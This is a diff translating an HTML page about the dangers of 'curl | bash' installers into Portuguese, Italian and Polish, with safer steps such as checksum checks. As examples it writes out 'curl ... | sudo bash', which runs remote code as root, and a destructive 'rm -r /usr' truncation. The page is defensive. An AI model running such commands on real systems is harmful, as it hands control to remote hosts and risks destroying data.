+            <strong>Adicione <code>sudo</code> e est&#225; tudo perdido</strong>
+            <p><code>curl ... | sudo bash</code> concede acesso root a quem controlar aquela URL naquele momento. Esse padr&#227;o aparece em documenta&#231;&#227;o real publicada. Com frequ&#234;ncia.</p>
           </div>
         </li>
         </ul>
@@ -1334,33 +1334,33 @@
           <div class="example-header">
             <span class="tag danger">sudo</span>
             <span class="tag danger">no checksum</span>
-            <span class="tool">developer environment manager</span>
+            <span class="tool">gerenciador de ambiente de desenvolvimento</span>
           </div>
-          <div class="example-body">Downloaded a binary to <strong>/usr/local/bin via sudo</strong> with no integrity check. If a required dependency wasn&#8217;t present, the script silently pulled in gigabytes of additional tooling. Also followed an undisclosed redirect chain between domains.</div>
+          <div class="example-body">Baixou um bin&#225;rio para <strong>/usr/local/bin via sudo</strong> sem verifica&#231;&#227;o de integridade. Se alguma depend&#234;ncia necess&#225;ria n&#227;o estivesse presente, o script baixava silenciosamente gigabytes de ferramentas adicionais. Tamb&#233;m seguia uma cadeia de redirecionamentos n&#227;o divulgada entre dom&#237;nios.</div>
         </div>
         <div class="example">
           <div class="example-header">
             <span class="tag danger">live dev branch</span>
             <span class="tag danger">no checksum</span>
-            <span class="tool">cloud coding tool</span>
+            <span class="tool">ferramenta de codifica&#231;&#227;o na nuvem</span>
           </div>
-          <div class="example-body">The install URL silently redirected to a <strong>live dev branch on GitHub</strong> &#8212; no version tags, no pinning. Every commit to that branch changed what users got. What ran yesterday is not what runs today.</div>
+          <div class="example-body">A URL de instala&#231;&#227;o redirecionava silenciosamente para uma <strong>branch de desenvolvimento ativa no GitHub</strong> &#8212; sem tags de vers&#227;o, sem fixar vers&#245;es. Cada commit nessa branch mudava o que os usu&#225;rios recebiam. O que foi executado ontem n&#227;o &#233; o que &#233; executado hoje.</div>
         </div>
         <div class="example">
           <div class="example-header">
             <span class="tag warn">no checksum</span>
             <span class="tag warn">sudo possible</span>
-            <span class="tool">open-source AI agent</span>
+            <span class="tool">agente de IA de c&#243;digo aberto</span>
           </div>
-          <div class="example-body">Pulled in a Python runtime, a JavaScript runtime, and a full headless browser (~300&#8239;MB). May invoke sudo to install system packages. After removing the main directory, system-level traces remain.</div>
+          <div class="example-body">Baixou um runtime de Python, um runtime de JavaScript e um navegador headless completo (~300&#8239;MB). Pode invocar sudo para instalar pacotes do sistema. Ap&#243;s remover o diret&#243;rio principal, rastros no n&#237;vel do sistema permanecem.</div>
         </div>
         <div class="example">
           <div class="example-header">
             <span class="tag warn">closed CDN</span>
             <span class="tag warn">no checksum</span>
-            <span class="tool">code assistant from a major hardware vendor</span>
+            <span class="tool">assistente de c&#243;digo de um grande fabricante de hardware</span>
           </div>
-          <div class="example-body">Downloads from a proprietary internal CDN with no public source history and no checksum. There is nothing to audit and no way to verify what you received.</div>
+          <div class="example-body">Faz download de um CDN interno propriet&#225;rio sem hist&#243;rico de fonte p&#250;blica e sem soma de verifica&#231;&#227;o. N&#227;o h&#225; nada a auditar e nenhuma forma de verificar o que voc&#234; recebeu.</div>
         </div>
         </div>
       </section>
@@ -1369,8 +1369,8 @@
         <h2>Faça assim</h2>
         <div class="alternatives">
         <div class="alt">
-          <h3>1. Use a real package manager</h3>
-          <p>The boring option is usually the right one. Package managers handle integrity, updates, and uninstallation.</p>
+          <h3>1. Use um gerenciador de pacotes de verdade</h3>
+          <p>A op&#231;&#227;o entediante costuma ser a certa. Gerenciadores de pacotes cuidam da integridade, atualiza&#231;&#245;es e desinstala&#231;&#227;o.</p>
           <div class="term">
   <span class="cmt"># macOS</span><br>
   <span class="prompt">$ </span><span class="cmd">brew install</span> <span class="url">sometool</span><br><br>
@@ -1381,8 +1381,8 @@
 </div>
         </div>
         <div class="alt">
-          <h3>2. Download, inspect, then run</h3>
-          <p>One extra step. Gives you a chance to read the script and keeps a local copy for future reference.</p>
+          <h3>2. Baixe, inspecione e depois execute</h3>
+          <p>Um passo extra. D&#225; a voc&#234; a chance de ler o script e mant&#233;m uma c&#243;pia local para refer&#234;ncia futura.</p>
           <div class="term">
   <span class="prompt">$ </span><span class="cmd">curl</span> <span class="flag">-fsSL</span> <span class="url">https://example.com/install.sh</span> <span class="flag">-o</span> <span class="url">install.sh</span><br>
   <span class="prompt">$ </span><span class="cmd">cat</span> <span class="url">install.sh</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="cmt"># actually read it</span><br>
@@ -1390,19 +1390,19 @@
 </div>
         </div>
         <div class="alt">
-          <h3>3. Log everything that executes</h3>
-          <p>If you must pipe &#8212; record what ran so you can audit or undo later.</p>
+          <h3>3. Registre tudo o que &#233; executado</h3>
+          <p>Se voc&#234; precisar usar pipe &#8212; registre o que foi executado para que possa auditar ou desfazer depois.</p>
           <div class="term">
   <span class="prompt">$ </span><span class="cmd">curl</span> <span class="flag">-fsSL</span> <span class="url">https://example.com/install.sh</span> <span class="pipe">|</span> <span class="cmd">bash -x</span> <span class="flag">2&gt;&amp;1</span> <span class="pipe">|</span> <span class="cmd">tee</span> <span class="url">install.log</span>
 </div>
           <div class="callout warn">
             <strong>Atenção</strong>
-            <code>bash -x</code> traces top-level commands only. Subprocesses and sourced scripts won&#8217;t appear in the log.
+            <code>bash -x</code> rastreia apenas os comandos de n&#237;vel superior. Subprocessos e scripts inclu&#237;dos com source n&#227;o aparecer&#227;o no log.
           </div>
         </div>
         <div class="alt">
-          <h3>4. Verify the checksum</h3>
-          <p>If the project publishes a SHA-256 hash, use it. Non-negotiable on production machines.</p>
+          <h3>4. Verifique a soma de verifica&#231;&#227;o</h3>
+          <p>Se o projeto publicar um hash SHA-256, use-o. Inegoci&#225;vel em m&#225;quinas de produ&#231;&#227;o.</p>
           <div class="term">
   <span class="prompt">$ </span><span class="cmd">curl</span> <span class="flag">-fsSL</span> <span class="url">https://example.com/install.sh</span> <span class="flag">-o</span> <span class="url">install.sh</span><br>
   <span class="prompt">$ </span><span class="cmd">echo</span> <span class="url">"abc123&#8230;expectedhash&nbsp;&nbsp;install.sh"</span> <span class="pipe">|</span> <span class="cmd">sha256sum -c</span><br>
@@ -1414,10 +1414,10 @@
       </section>
 
       <section>
-        <h2>Common Objection</h2>
+        <h2>Objec&#231;&#227;o comum</h2>
         <div class="faq">
-          <p class="faq-q">&#8220;But I trust the vendor, so it&#8217;s fine, right?&#8221;</p>
-          <p class="faq-a">Trusting the vendor is necessary but not sufficient. <code>curl | bash</code> adds attack surface <em>on top of</em> that trust: you also trust DNS, the CDN, the hosting provider, and anyone who might compromise the URL between now and the moment you run it. A package installed through a package manager goes through additional verification layers. The vendor being reputable doesn&#8217;t make the delivery mechanism safe.</p>
+          <p class="faq-q">&#171;Mas eu confio no fornecedor, ent&#227;o est&#225; tudo bem, n&#227;o est&#225;?&#187;</p>
+          <p class="faq-a">Confiar no fornecedor &#233; necess&#225;rio, mas n&#227;o suficiente. `curl | bash` adiciona superf&#237;cie de ataque sobre essa confian&#231;a: voc&#234; tamb&#233;m confia em DNS, no CDN, no provedor de hospedagem e em qualquer pessoa que possa comprometer a URL entre agora e o momento em que voc&#234; a executar. Um pacote instalado por meio de um gerenciador de pacotes passa por camadas adicionais de verifica&#231;&#227;o. O fato de o fornecedor ser conceituado n&#227;o torna o mecanismo de entrega seguro.</p>
         </div>
       </section>
 
@@ -1451,43 +1451,43 @@
         <li>
           <span class="icon">&#9889;</span>
           <div class="body">
-            <strong>Bash starts before the download finishes</strong>
-            <p>The pipe is live. Bash receives and executes lines as they arrive. Drop the connection mid-transfer and you get partial execution: a command like <code>rm -r /usr/share/program</code> can truncate to <code>rm -r /usr</code>. Commands ran, cleanup didn&#8217;t.</p>
+            <strong>Bash inizia prima che il download finisca</strong>
+            <p>La pipe &#232; attiva. Bash riceve ed esegue le righe man mano che arrivano. Interrompi la connessione a met&#224; trasferimento: un comando come <code>rm -r /usr/share/program</code> pu&#242; essere troncato a <code>rm -r /usr</code>. I comandi sono stati eseguiti, la pulizia no.</p>
           </div>
         </li>
         <li>
           <span class="icon">&#127917;</span>
           <div class="body">
-            <strong>The server knows you&#8217;re piping &#8212; and can lie</strong>
-            <p>Servers detect the curl User-Agent or use timing: send a <code>sleep</code> command early in the script &#8212; if bash is executing it, pipe reads pause, curl blocks, and the server observes the delay. Confirmed execution. Then serve a different payload. &#8220;I&#8217;ll read it in the browser first&#8221; doesn&#8217;t protect you: what you read is not what ran.</p>
+            <strong>Il server sa che stai usando una pipe &#8212; e pu&#242; mentire</strong>
+            <p>I server rilevano il User-Agent di curl o usano la temporizzazione: inviano un comando <code>sleep</code> all&#8217;inizio dello script &#8212; se bash lo sta eseguendo, la lettura della pipe si mette in pausa, curl si blocca e il server osserva il ritardo. Esecuzione confermata. Poi servono un payload diverso. &#171;Lo legger&#242; prima nel browser&#187; non ti protegge: quello che leggi non &#232; ci&#242; che &#232; stato eseguito.</p>
           </div>
         </li>
         <li>
           <span class="icon">&#128274;</span>
           <div class="body">
-            <strong>No integrity verification</strong>
-            <p>No checksum, no signature. You trust DNS, TLS, the CDN, and the origin simultaneously. A compromised CDN or BGP hijack delivers malware silently.</p>
+            <strong>Nessuna verifica dell&#8217;integrit&#224;</strong>
+            <p>Nessun checksum, nessuna firma. Ti fidi di DNS, TLS, del CDN e dell&#8217;origine contemporaneamente. Un CDN compromesso o un dirottamento BGP consegna malware in silenzio.</p>
           </div>
         </li>
         <li>
           <span class="icon">&#128279;</span>
           <div class="body">
-            <strong>You trust more than you think</strong>
-            <p>Not just the author. You trust the domain registrar, DNS provider, CDN, hosting, every CI/CD pipeline that built the artifact, and every future maintainer who will ever push to that repo.</p>
+            <strong>Ti fidi di pi&#249; di quanto pensi</strong>
+            <p>Non solo dell&#8217;autore. Ti fidi del registrar del dominio, del provider DNS, del CDN, dell&#8217;hosting, di ogni pipeline CI/CD che ha costruito l&#8217;artefatto e di ogni futuro manutentore che far&#224; mai push su quel repository.</p>
           </div>
         </li>
         <li>
           <span class="icon">&#128203;</span>
           <div class="body">
-            <strong>You can&#8217;t reproduce what ran</strong>
-            <p>The URL is live and mutable. No record exists of what exactly executed on your machine &#8212; only that something did.</p>
+            <strong>Non puoi riprodurre ci&#242; che &#232; stato eseguito</strong>
+            <p>L&#8217;URL &#232; attiva e mutabile. Non esiste alcun registro di ci&#242; che esattamente &#232; stato eseguito sulla tua macchina &#8212; solo che qualcosa &#232; stato eseguito.</p>
           </div>
         </li>
         <li>
           <span class="icon">&#128273;</span>
           <div class="body">
-            <strong>Add <code>sudo</code> and it&#8217;s game over</strong>
-            <p><code>curl ... | sudo bash</code> grants root to whoever controls that URL at that moment. This pattern appears in real published docs. Often.</p>
+            <strong>Aggiungi <code>sudo</code> e la partita &#232; finita</strong>
+            <p><code>curl ... | sudo bash</code> concede i privilegi di root a chiunque controlli quell&#8217;URL in quel momento. Questo schema appare in documentazione reale pubblicata. Spesso.</p>
           </div>
         </li>
         </ul>
@@ -1501,33 +1501,33 @@
           <div class="example-header">
             <span class="tag danger">sudo</span>
             <span class="tag danger">no checksum</span>
-            <span class="tool">developer environment manager</span>
+            <span class="tool">gestore di ambienti di sviluppo</span>
           </div>
-          <div class="example-body">Downloaded a binary to <strong>/usr/local/bin via sudo</strong> with no integrity check. If a required dependency wasn&#8217;t present, the script silently pulled in gigabytes of additional tooling. Also followed an undisclosed redirect chain between domains.</div>
+          <div class="example-body">Ha scaricato un binario in <strong>/usr/local/bin tramite sudo</strong> senza alcuna verifica di integrit&#224;. Se una dipendenza richiesta non era presente, lo script scaricava silenziosamente gigabyte di strumenti aggiuntivi. Seguiva inoltre una catena di redirect non divulgata tra domini.</div>
         </div>
         <div class="example">
           <div class="example-header">
             <span class="tag danger">live dev branch</span>
             <span class="tag danger">no checksum</span>
-            <span class="tool">cloud coding tool</span>
+            <span class="tool">strumento di sviluppo nel cloud</span>
           </div>
-          <div class="example-body">The install URL silently redirected to a <strong>live dev branch on GitHub</strong> &#8212; no version tags, no pinning. Every commit to that branch changed what users got. What ran yesterday is not what runs today.</div>
+          <div class="example-body">L&#8217;URL di installazione reindirizzava silenziosamente a un <strong>branch di sviluppo attivo su GitHub</strong> &#8212; senza tag di versione, senza blocco della versione. Ogni commit su quel branch cambiava ci&#242; che ricevevano gli utenti. Ci&#242; che &#232; stato eseguito ieri non &#232; ci&#242; che viene eseguito oggi.</div>
         </div>
         <div class="example">
           <div class="example-header">
             <span class="tag warn">no checksum</span>
             <span class="tag warn">sudo possible</span>
-            <span class="tool">open-source AI agent</span>
+            <span class="tool">agente AI open source</span>
           </div>
-          <div class="example-body">Pulled in a Python runtime, a JavaScript runtime, and a full headless browser (~300&#8239;MB). May invoke sudo to install system packages. After removing the main directory, system-level traces remain.</div>
+          <div class="example-body">Ha scaricato un runtime Python, un runtime JavaScript e un browser headless completo (~300&#8239;MB). Pu&#242; invocare sudo per installare pacchetti di sistema. Dopo aver rimosso la directory principale, rimangono tracce a livello di sistema.</div>
         </div>
         <div class="example">
           <div class="example-header">
             <span class="tag warn">closed CDN</span>
             <span class="tag warn">no checksum</span>
-            <span class="tool">code assistant from a major hardware vendor</span>
+            <span class="tool">assistente al codice di un importante produttore di hardware</span>
           </div>
-          <div class="example-body">Downloads from a proprietary internal CDN with no public source history and no checksum. There is nothing to audit and no way to verify what you received.</div>
+          <div class="example-body">Scarica da un CDN interno proprietario senza cronologia della sorgente pubblica e senza checksum. Non c&#8217;&#232; nulla da verificare e nessun modo per controllare ci&#242; che hai ricevuto.</div>
         </div>
         </div>
       </section>
@@ -1536,8 +1536,8 @@
         <h2>Fai così invece</h2>
         <div class="alternatives">
         <div class="alt">
-          <h3>1. Use a real package manager</h3>
-          <p>The boring option is usually the right one. Package managers handle integrity, updates, and uninstallation.</p>
+          <h3>1. Usa un vero gestore di pacchetti</h3>
+          <p>L&#8217;opzione noiosa di solito &#232; quella giusta. I gestori di pacchetti gestiscono integrit&#224;, aggiornamenti e disinstallazione.</p>
           <div class="term">
   <span class="cmt"># macOS</span><br>
   <span class="prompt">$ </span><span class="cmd">brew install</span> <span class="url">sometool</span><br><br>
@@ -1548,8 +1548,8 @@
 </div>
         </div>
         <div class="alt">
-          <h3>2. Download, inspect, then run</h3>
-          <p>One extra step. Gives you a chance to read the script and keeps a local copy for future reference.</p>
+          <h3>2. Scarica, ispeziona e poi esegui</h3>
+          <p>Un passo in pi&#249;. Ti d&#224; la possibilit&#224; di leggere lo script e conserva una copia locale per riferimenti futuri.</p>
           <div class="term">
   <span class="prompt">$ </span><span class="cmd">curl</span> <span class="flag">-fsSL</span> <span class="url">https://example.com/install.sh</span> <span class="flag">-o</span> <span class="url">install.sh</span><br>
   <span class="prompt">$ </span><span class="cmd">cat</span> <span class="url">install.sh</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="cmt"># actually read it</span><br>
@@ -1557,19 +1557,19 @@
 </div>
         </div>
         <div class="alt">
-          <h3>3. Log everything that executes</h3>
-          <p>If you must pipe &#8212; record what ran so you can audit or undo later.</p>
+          <h3>3. Registra tutto ci&#242; che viene eseguito</h3>
+          <p>Se devi usare una pipe &#8212; registra ci&#242; che &#232; stato eseguito cos&#236; puoi fare un&#8217;analisi o annullare in seguito.</p>
           <div class="term">
   <span class="prompt">$ </span><span class="cmd">curl</span> <span class="flag">-fsSL</span> <span class="url">https://example.com/install.sh</span> <span class="pipe">|</span> <span class="cmd">bash -x</span> <span class="flag">2&gt;&amp;1</span> <span class="pipe">|</span> <span class="cmd">tee</span> <span class="url">install.log</span>
 </div>
           <div class="callout warn">
             <strong>Nota</strong>
-            <code>bash -x</code> traces top-level commands only. Subprocesses and sourced scripts won&#8217;t appear in the log.
+            <code>bash -x</code> traccia solo i comandi di primo livello. I sottoprocessi e gli script inclusi con source non appariranno nel log.
           </div>
         </div>
         <div class="alt">
-          <h3>4. Verify the checksum</h3>
-          <p>If the project publishes a SHA-256 hash, use it. Non-negotiable on production machines.</p>
+          <h3>4. Verifica il checksum</h3>
+          <p>Se il progetto pubblica un hash SHA-256, usalo. Non negoziabile su macchine di produzione.</p>
           <div class="term">
   <span class="prompt">$ </span><span class="cmd">curl</span> <span class="flag">-fsSL</span> <span class="url">https://example.com/install.sh</span> <span class="flag">-o</span> <span class="url">install.sh</span><br>
   <span class="prompt">$ </span><span class="cmd">echo</span> <span class="url">"abc123&#8230;expectedhash&nbsp;&nbsp;install.sh"</span> <span class="pipe">|</span> <span class="cmd">sha256sum -c</span><br>
@@ -1581,10 +1581,10 @@
       </section>
 
       <section>
-        <h2>Common Objection</h2>
+        <h2>Obiezione comune</h2>
         <div class="faq">
-          <p class="faq-q">&#8220;But I trust the vendor, so it&#8217;s fine, right?&#8221;</p>
-          <p class="faq-a">Trusting the vendor is necessary but not sufficient. <code>curl | bash</code> adds attack surface <em>on top of</em> that trust: you also trust DNS, the CDN, the hosting provider, and anyone who might compromise the URL between now and the moment you run it. A package installed through a package manager goes through additional verification layers. The vendor being reputable doesn&#8217;t make the delivery mechanism safe.</p>
+          <p class="faq-q">&#171;Ma mi fido del fornitore, quindi va bene, no?&#187;</p>
+          <p class="faq-a">Fidarsi del fornitore &#232; necessario ma non sufficiente. `curl | bash` aggiunge superficie di attacco su quella fiducia: ti fidi anche di DNS, del CDN, del provider di hosting e di chiunque potrebbe compromettere l&#8217;URL tra ora e il momento in cui lo esegui. Un pacchetto installato tramite un gestore di pacchetti passa attraverso ulteriori livelli di verifica. Il fatto che il fornitore sia affidabile non rende il meccanismo di consegna sicuro.</p>
         </div>
       </section>
 
@@ -1618,43 +1618,43 @@
         <li>
           <span class="icon">&#9889;</span>
           <div class="body">
-            <strong>Bash starts before the download finishes</strong>
-            <p>The pipe is live. Bash receives and executes lines as they arrive. Drop the connection mid-transfer and you get partial execution: a command like <code>rm -r /usr/share/program</code> can truncate to <code>rm -r /usr</code>. Commands ran, cleanup didn&#8217;t.</p>
+            <strong>Bash uruchamia si&#281; zanim pobieranie dobiegnie ko&#324;ca</strong>
+            <p>Potok dzia&#322;a na &#380;ywo. Bash odbiera i wykonuje linie w miar&#281; ich nap&#322;ywania. Przerwij po&#322;&#261;czenie w trakcie transferu: polecenie takie jak <code>rm -r /usr/share/program</code> mo&#380;e zosta&#263; obci&#281;te do <code>rm -r /usr</code>. Polecenia zosta&#322;y wykonane, czyszczenie nie.</p>
           </div>
         </li>
         <li>
           <span class="icon">&#127917;</span>
           <div class="body">
-            <strong>The server knows you&#8217;re piping &#8212; and can lie</strong>
-            <p>Servers detect the curl User-Agent or use timing: send a <code>sleep</code> command early in the script &#8212; if bash is executing it, pipe reads pause, curl blocks, and the server observes the delay. Confirmed execution. Then serve a different payload. &#8220;I&#8217;ll read it in the browser first&#8221; doesn&#8217;t protect you: what you read is not what ran.</p>
+            <strong>Serwer wie, &#380;e u&#380;ywasz potoku &#8212; i mo&#380;e k&#322;ama&#263;</strong>
+            <p>Serwery wykrywaj&#261; curl User-Agent lub u&#380;ywaj&#261; pomiaru czasu: wysy&#322;aj&#261; polecenie <code>sleep</code> na pocz&#261;tku skryptu &#8212; je&#347;li bash je wykonuje, odczyty potoku si&#281; wstrzymuj&#261;, curl blokuje, a serwer obserwuje op&#243;&#378;nienie. Potwierdzono wykonanie. Nast&#281;pnie serwuje inny &#322;adunek. &#8222;Najpierw przeczytam to w przegl&#261;darce&#8221; nie chroni ci&#281;: to, co czytasz, nie jest tym, co zosta&#322;o uruchomione.</p>
           </div>
         </li>
         <li>
           <span class="icon">&#128274;</span>
           <div class="body">
-            <strong>No integrity verification</strong>
-            <p>No checksum, no signature. You trust DNS, TLS, the CDN, and the origin simultaneously. A compromised CDN or BGP hijack delivers malware silently.</p>
+            <strong>Brak weryfikacji integralno&#347;ci</strong>
+            <p>Brak sumy kontrolnej, brak podpisu. Ufasz DNS, TLS, CDN i serwerowi &#378;r&#243;d&#322;owemu jednocze&#347;nie. Skompromitowane CDN lub przechwycenie BGP dostarcza z&#322;o&#347;liwe oprogramowanie bez &#380;adnego sygna&#322;u.</p>
           </div>
         </li>
         <li>
           <span class="icon">&#128279;</span>
           <div class="body">
-            <strong>You trust more than you think</strong>
-            <p>Not just the author. You trust the domain registrar, DNS provider, CDN, hosting, every CI/CD pipeline that built the artifact, and every future maintainer who will ever push to that repo.</p>
+            <strong>Ufasz wi&#281;cej, ni&#380; my&#347;lisz</strong>
+            <p>Nie tylko autorowi. Ufasz rejestratorowi domeny, dostawcy DNS, CDN, hostingowi, ka&#380;demu potokowi CI/CD, kt&#243;ry zbudowa&#322; artefakt, i ka&#380;demu przysz&#322;emu opiekunowi, kt&#243;ry kiedykolwiek wypchnie do tego repozytorium.</p>
           </div>
         </li>
         <li>
           <span class="icon">&#128203;</span>
           <div class="body">
-            <strong>You can&#8217;t reproduce what ran</strong>
-            <p>The URL is live and mutable. No record exists of what exactly executed on your machine &#8212; only that something did.</p>
+            <strong>Nie mo&#380;esz odtworzy&#263; tego, co zosta&#322;o uruchomione</strong>
+            <p>URL jest aktywny i zmienny. Nie istnieje &#380;aden zapis tego, co dok&#322;adnie zosta&#322;o wykonane na twoim komputerze &#8212; jedynie to, &#380;e co&#347; zosta&#322;o.</p>
           </div>
         </li>
         <li>
           <span class="icon">&#128273;</span>
           <div class="body">
-            <strong>Add <code>sudo</code> and it&#8217;s game over</strong>
-            <p><code>curl ... | sudo bash</code> grants root to whoever controls that URL at that moment. This pattern appears in real published docs. Often.</p>
+            <strong>Dodaj <code>sudo</code> i po wszystkim</strong>
+            <p><code>curl ... | sudo bash</code> nadaje uprawnienia root temu, kto kontroluje ten URL w danym momencie. Ten wz&#243;r pojawia si&#281; w prawdziwej, opublikowanej dokumentacji. Cz&#281;sto.</p>
           </div>
         </li>
         </ul>
@@ -1668,33 +1668,33 @@
           <div class="example-header">
             <span class="tag danger">sudo</span>
             <span class="tag danger">no checksum</span>
-            <span class="tool">developer environment manager</span>
+            <span class="tool">mened&#380;er &#347;rodowisk deweloperskich</span>
           </div>
-          <div class="example-body">Downloaded a binary to <strong>/usr/local/bin via sudo</strong> with no integrity check. If a required dependency wasn&#8217;t present, the script silently pulled in gigabytes of additional tooling. Also followed an undisclosed redirect chain between domains.</div>
+          <div class="example-body">Pobrano plik binarny do <strong>/usr/local/bin przez sudo</strong> bez weryfikacji integralno&#347;ci. Je&#347;li brakowa&#322;o wymaganej zale&#380;no&#347;ci, skrypt po cichu pobiera&#322; gigabajty dodatkowych narz&#281;dzi. Ponadto pod&#261;&#380;a&#322; za nieujawnionym &#322;a&#324;cuchem przekierowa&#324; mi&#281;dzy domenami.</div>
         </div>
         <div class="example">
           <div class="example-header">
             <span class="tag danger">live dev branch</span>
             <span class="tag danger">no checksum</span>
-            <span class="tool">cloud coding tool</span>
+            <span class="tool">narz&#281;dzie do kodowania w chmurze</span>
           </div>
-          <div class="example-body">The install URL silently redirected to a <strong>live dev branch on GitHub</strong> &#8212; no version tags, no pinning. Every commit to that branch changed what users got. What ran yesterday is not what runs today.</div>
+          <div class="example-body">URL instalacyjny po cichu przekierowywa&#322; na <strong>aktywn&#261; ga&#322;&#261;&#378; dewelopersk&#261; na GitHub</strong> &#8212; bez tag&#243;w wersji, bez przypinania. Ka&#380;dy commit do tej ga&#322;&#281;zi zmienia&#322; to, co otrzymywali u&#380;ytkownicy. To, co uruchomiono wczoraj, nie jest tym, co uruchamia si&#281; dzi&#347;.</div>
         </div>
         <div class="example">
           <div class="example-header">
             <span class="tag warn">no checksum</span>
             <span class="tag warn">sudo possible</span>
-            <span class="tool">open-source AI agent</span>
+            <span class="tool">otwartoźr&#243;d&#322;owy agent AI</span>
           </div>
-          <div class="example-body">Pulled in a Python runtime, a JavaScript runtime, and a full headless browser (~300&#8239;MB). May invoke sudo to install system packages. After removing the main directory, system-level traces remain.</div>
+          <div class="example-body">Pobrano &#347;rodowisko uruchomieniowe Python, &#347;rodowisko uruchomieniowe JavaScript i pe&#322;n&#261; przegl&#261;dark&#281; bezg&#322;ow&#261; (~300&#8239;MB). Mo&#380;e wywo&#322;ywa&#263; sudo w celu instalacji paket&#243;w systemowych. Po usuni&#281;ciu g&#322;&#243;wnego katalogu pozostaj&#261; &#347;lady na poziomie systemu.</div>
         </div>
         <div class="example">
           <div class="example-header">
             <span class="tag warn">closed CDN</span>
             <span class="tag warn">no checksum</span>
-            <span class="tool">code assistant from a major hardware vendor</span>
+            <span class="tool">asystent kodu od g&#322;&#243;wnego producenta sprz&#281;tu</span>
           </div>
-          <div class="example-body">Downloads from a proprietary internal CDN with no public source history and no checksum. There is nothing to audit and no way to verify what you received.</div>
+          <div class="example-body">Pobiera z zastrze&#380;onego wewn&#281;trznego CDN bez publicznej historii &#378;r&#243;de&#322; i bez sumy kontrolnej. Nie ma nic do audytu i &#380;adnego sposobu na weryfikacj&#281; tego, co otrzyma&#322;e&#347;.</div>
         </div>
         </div>
       </section>
@@ -1703,8 +1703,8 @@
         <h2>Zrób to zamiast tego</h2>
         <div class="alternatives">
         <div class="alt">
-          <h3>1. Use a real package manager</h3>
-          <p>The boring option is usually the right one. Package managers handle integrity, updates, and uninstallation.</p>
+          <h3>1. U&#380;ywaj prawdziwego mened&#380;era pakiet&#243;w</h3>
+          <p>Nudna opcja jest zazwyczaj w&#322;a&#347;ciw&#261;. Mened&#380;ery pakiet&#243;w dbaj&#261; o integralno&#347;&#263;, aktualizacje i deinstalacj&#281;.</p>
           <div class="term">
   <span class="cmt"># macOS</span><br>
   <span class="prompt">$ </span><span class="cmd">brew install</span> <span class="url">sometool</span><br><br>
@@ -1715,8 +1715,8 @@
 </div>
         </div>
         <div class="alt">
-          <h3>2. Download, inspect, then run</h3>
-          <p>One extra step. Gives you a chance to read the script and keeps a local copy for future reference.</p>
+          <h3>2. Pobierz, sprawd&#378;, potem uruchom</h3>
+          <p>Jeden dodatkowy krok. Daje ci szans&#281; przeczytania skryptu i zachowuje lokaln&#261; kopi&#281; do przysz&#322;ego u&#380;ytku.</p>
           <div class="term">
   <span class="prompt">$ </span><span class="cmd">curl</span> <span class="flag">-fsSL</span> <span class="url">https://example.com/install.sh</span> <span class="flag">-o</span> <span class="url">install.sh</span><br>
   <span class="prompt">$ </span><span class="cmd">cat</span> <span class="url">install.sh</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="cmt"># actually read it</span><br>
@@ -1724,19 +1724,19 @@
 </div>
         </div>
         <div class="alt">
-          <h3>3. Log everything that executes</h3>
-          <p>If you must pipe &#8212; record what ran so you can audit or undo later.</p>
+          <h3>3. Rejestruj wszystko, co zostaje wykonane</h3>
+          <p>Je&#347;li musisz u&#380;ywa&#263; potoku &#8212; zapisz, co zosta&#322;o uruchomione, aby&#347; m&#243;g&#322; to p&#243;&#378;niej zaudytowa&#263; lub cofn&#261;&#263;.</p>
           <div class="term">
   <span class="prompt">$ </span><span class="cmd">curl</span> <span class="flag">-fsSL</span> <span class="url">https://example.com/install.sh</span> <span class="pipe">|</span> <span class="cmd">bash -x</span> <span class="flag">2&gt;&amp;1</span> <span class="pipe">|</span> <span class="cmd">tee</span> <span class="url">install.log</span>
 </div>
           <div class="callout warn">
             <strong>Uwaga</strong>
-            <code>bash -x</code> traces top-level commands only. Subprocesses and sourced scripts won&#8217;t appear in the log.
+            <code>bash -x</code> &#347;ledzi jedynie polecenia najwy&#380;szego poziomu. Podprocesy i do&#322;&#261;czane skrypty nie pojawi&#261; si&#281; w dzienniku.
           </div>
         </div>
         <div class="alt">
-          <h3>4. Verify the checksum</h3>
-          <p>If the project publishes a SHA-256 hash, use it. Non-negotiable on production machines.</p>
+          <h3>4. Zweryfikuj sum&#281; kontroln&#261;</h3>
+          <p>Je&#347;li projekt publikuje skr&#243;t SHA-256, u&#380;yj go. Niezb&#281;dne na maszynach produkcyjnych.</p>
           <div class="term">
   <span class="prompt">$ </span><span class="cmd">curl</span> <span class="flag">-fsSL</span> <span class="url">https://example.com/install.sh</span> <span class="flag">-o</span> <span class="url">install.sh</span><br>
   <span class="prompt">$ </span><span class="cmd">echo</span> <span class="url">"abc123&#8230;expectedhash&nbsp;&nbsp;install.sh"</span> <span class="pipe">|</span> <span class="cmd">sha256sum -c</span><br>
@@ -1748,10 +1748,10 @@
       </section>
 
       <section>
-        <h2>Common Objection</h2>
+        <h2>Cz&#281;sty zarzut</h2>
         <div class="faq">
-          <p class="faq-q">&#8220;But I trust the vendor, so it&#8217;s fine, right?&#8221;</p>
-          <p class="faq-a">Trusting the vendor is necessary but not sufficient. <code>curl | bash</code> adds attack surface <em>on top of</em> that trust: you also trust DNS, the CDN, the hosting provider, and anyone who might compromise the URL between now and the moment you run it. A package installed through a package manager goes through additional verification layers. The vendor being reputable doesn&#8217;t make the delivery mechanism safe.</p>
+          <p class="faq-q">&#8222;Ale ufam dostawcy, wi&#281;c wszystko w porz&#261;dku, prawd&#261;?&#8221;</p>
+          <p class="faq-a">Zaufanie dostawcy jest konieczne, ale niewystarczaj&#261;ce. `curl | bash` dodaje powierzchni&#281; ataku na wierzch tego zaufania: ufasz r&#243;wnie&#380; DNS, CDN, dostawcy hostingu i ka&#380;demu, kto m&#243;g&#322;by skompromitowa&#263; URL mi&#281;dzy teraz a momentem jego uruchomienia. Pakiet zainstalowany przez mened&#380;era pakiet&#243;w przechodzi przez dodatkowe warstwy weryfikacji. Renoma dostawcy nie sprawia, &#380;e mechanizm dostarczania jest bezpieczny.</p>
         </div>
       </section>
 
@@ -1785,43 +1785,43 @@
         <li>
           <span class="icon">&#9889;</span>
           <div class="body">
-            <strong>Bash starts before the download finishes</strong>
